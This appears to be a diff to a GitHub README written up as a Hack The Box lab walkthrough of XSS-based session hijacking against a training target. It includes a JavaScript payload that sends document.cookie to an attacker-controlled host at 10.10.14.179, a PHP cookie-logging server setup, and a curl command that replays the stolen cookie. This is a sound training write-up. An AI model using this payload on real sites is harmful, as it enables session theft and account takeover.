@@ -6,9 +6,12 @@ This repository documents identifying a vulnerable input field via XSS and perfo
 - **Target IP:** `10.129.31.89`
 - **Date:** April 11, 2025
 
-## Steps
+# Objective
+The goal was to identify a vulnerable input field in a web form hosted at ` http://10.129.31.89/hijacking/index.php `, exploit it using Cross-Site Scripting (XSS), and perform session hijacking to steal the admin’s session cookie. The captured cookie would then be used to authenticate to ` http://10.129.31.89/hijacking/login.php ` and retrieve a flag, likely part of a Hack The Box (HTB) lab challenge.
 
-### 1. Set Up Attacker Server
+## Step-by-Step-Solution
+
+### Step 1: Set Up Attacker Server
 ```bash
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
@@ -31,6 +34,8 @@ if (isset($_GET['c'])) {
 ```bash
 new Image().src='http://10.10.14.179/index.php?c='+document.cookie;
 ```
+![Screenshot 2025-04-11 121049](https://github.com/user-attachments/assets/d73e3601-5734-474c-a982-8b3e09d9a51f)
+
 **cookies.txt**
 ```bash
 sudo touch cookies.txt
@@ -40,7 +45,7 @@ sudo chmod 666 cookies.txt
 ```bash
 sudo php -S 0.0.0.0:80
 ```
-### 2. Identify Vulnerable Field
+### Step 2: Identify Vulnerable Field
 **Form**: ` http://10.129.31.89/hijacking/index.php`
 
 **Fields Tested:**
@@ -63,7 +68,10 @@ Checked server logs for requests (e.g., GET /fullname).
 
 Vulnerable field identified when a request appeared.
 
-### 3. Exploit with XSS
+![image](https://github.com/user-attachments/assets/549aa3b7-f9d2-4f40-bda3-55dc883c05c1)
+
+
+### Step 3: Exploit with XSS
 **Payload**: 
 
 ```bash ">
@@ -72,16 +80,51 @@ Vulnerable field identified when a request appeared.
 
 Inject this script into the vulnerable field
 
+
 **Cookie Captured**:
 ```bash
 cat cookies.txt
 ```
 
-### 4. Use Cookie in login.php
+### Step 4: Use Cookie in login.php
 URL: ` http://10.129.31.89/hijacking/login.php `
 
 Added cookie via DevTools > Storage > Cookies.
 
 Refreshed to get the flag.
+
+![Screenshot 2025-04-11 124820](https://github.com/user-attachments/assets/4727fca4-bd11-4b35-ae36-4e8c98bfa418)
+
+# Tools Used
+
+**PHP Development Server:**
+` sudo php -S 0.0.0.0:80 `
+
+Purpose: Hosted ` index.php ` and ` script.js ` on ` 10.10.14.179 ` to log cookies and serve the XSS payload.
+
+**cURL:**
+` curl -b "cookie=<value>" http://10.129.31.89/hijacking/login.php `
+
+Purpose: Tested the stolen cookie against ` login.php ` to retrieve the flag.
+
+**Web Browser with Developer Tools**:
+
+Browser: Any modern browser (e.g., Chrome, Firefox).
+
+Used to inspect the form, enable the submit button ` (document.getElementById('register').disabled = false;) ` , and manually set cookies in the Storage tab.
+
+**Text Editor**:
+
+nano (e.g., ` nano index.php, nano script.js ` ).
+
+Purpose: Created and edited server-side scripts (`index.php`) and client-side payload (`script.js`).
+
+**Terminal:**
+Managed server setup, file permissions (`sudo chmod 666 cookies.txt`), and log monitoring (`cat cookies.txt`).
+
+**Git:**
+`git init, git add, git commit, git push`.
+
+Purpose: Documented the process in a GitHub repository.
 
 
